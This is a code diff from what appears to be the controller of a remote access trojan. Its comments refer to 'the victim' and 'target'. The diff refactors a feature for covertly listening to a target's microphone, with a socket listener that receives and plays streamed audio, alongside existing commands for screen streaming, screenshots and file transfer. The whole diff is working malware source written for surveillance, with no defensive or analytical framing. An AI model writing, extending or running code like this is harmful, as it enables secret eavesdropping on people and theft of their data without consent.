@@ -78,6 +78,79 @@ def download_file(file_name):
     # Close the local file after downloading is complete.
     f.close()
 
+
+ERROR_HANDLER_FUNC = CFUNCTYPE(None, c_char_p, c_int, c_char_p, c_int, c_char_p)
+def py_error_handler(filename, line, function, err, fmt):
+    pass  # suppress all ALSA errors
+c_error_handler = ERROR_HANDLER_FUNC(py_error_handler)
+try:
+    asound = ctypes.cdll.LoadLibrary('libasound.so')
+    asound.snd_lib_error_set_handler(c_error_handler)
+except OSError:
+    pass  # libasound not found, skip suppression
+
+stream_flag = {'on': False}
+
+def start_audio_receiver():
+    global stream_flag, audio_thread
+    if not stream_flag['on']:
+        stream_flag['on'] = True
+        audio_thread = threading.Thread(target=stream_audio_from_target, args=(stream_flag,))
+        audio_thread.daemon = True
+        audio_thread.start()
+    else:
+        pass
+
+def stop_audio_receiver():
+    global stream_flag, audio_thread
+    if stream_flag['on']:
+        stream_flag['on'] = False
+        if audio_thread:
+            audio_thread.join()  # Wait for the audio thread to finish
+            audio_thread = None  # Reset the thread reference
+    else:
+        pass
+
+def stream_audio_from_target(flag):
+    stream_sock = socket.socket()
+    stream_sock.bind(('0.0.0.0', 9998))
+    stream_sock.listen(1)
+    conn, addr = stream_sock.accept()
+
+    CHUNK = 1024
+    FORMAT = pyaudio.paInt16
+    CHANNELS = 1
+    RATE = 11025
+
+    p = pyaudio.PyAudio()
+    stream = p.open(format=FORMAT, channels=CHANNELS,
+                    rate=RATE, output=True, frames_per_buffer=CHUNK)
+
+    try:
+        while flag['on']:
+            size_data = conn.recv(4)
+            if not size_data:
+                break
+            size = int.from_bytes(size_data, 'big')
+            data = b''
+            while len(data) < size:
+                packet = conn.recv(size - len(data))
+                if not packet:
+                    break
+                data += packet
+            if not data:
+                break
+            stream.write(data)
+    except Exception as e:
+        pass
+    finally:
+        stream.stop_stream()
+        stream.close()
+        p.terminate()
+        conn.close()
+        stream_sock.close()
+
+
 # Listens for incoming image data from the victim.
 def receive_screen_stream():
     stream_sock = socket.socket() # Create a TCP socket
@@ -111,43 +184,6 @@ def receive_screen_stream():
         cv2.destroyAllWindows()
 
 
-ERROR_HANDLER_FUNC = CFUNCTYPE(None, c_char_p, c_int, c_char_p, c_int, c_char_p)
-
-def py_error_handler(filename, line, function, err, fmt):
-    pass  # suppress all ALSA errors
-
-c_error_handler = ERROR_HANDLER_FUNC(py_error_handler)
-
-try:
-    asound = ctypes.cdll.LoadLibrary('libasound.so')
-    asound.snd_lib_error_set_handler(c_error_handler)
-except OSError:
-    pass  # libasound not found, skip suppression
-
-def stream_audio_from_target(flag):
-    CHUNK = 1024
-    FORMAT = pyaudio.paInt16
-    CHANNELS = 1
-    RATE = 11025
-
-    p = pyaudio.PyAudio()
-    stream = p.open(format=FORMAT, channels=CHANNELS,
-                    rate=RATE, output=True, frames_per_buffer=CHUNK)
-
-    try:
-        while flag['on']:
-            data = target.recv(CHUNK)
-            if not data:
-                break
-            stream.write(data)
-    except:
-        pass
-    finally:
-        stream.stop_stream()
-        stream.close()
-        p.terminate()
-
-
 # Function for the main communication loop with the target
 def target_communication():
     while True:
@@ -171,17 +207,13 @@ def target_communication():
             # If the user enters 'upload', initiate the upload of a file to the target.
             upload_file(command[7:])
         elif command == 'listening_start':
-            stream_flag = {'on': False}
-            if not stream_flag['on']:
-                stream_flag['on'] = True
-                audio_thread = threading.Thread(target=stream_audio_from_target, args=(stream_flag,))
-                audio_thread.daemon = True
-                audio_thread.start()
-            print("[+] Audio stream started.")
+            start_audio_receiver()
+            result = reliable_recv()
+            print(result)
         elif command == 'listening_stop':
-            stream_flag['on'] = False
-            audio_thread.join()  # Wait for the audio thread to finish
-            print("[+] Audio stream stopped.")
+            stop_audio_receiver()
+            result = reliable_recv()
+            print(result)
         elif command == 'screenshot':
             # If the user enters 'screenshot', send a command to take a screenshot on the target.
             shot = reliable_recv()
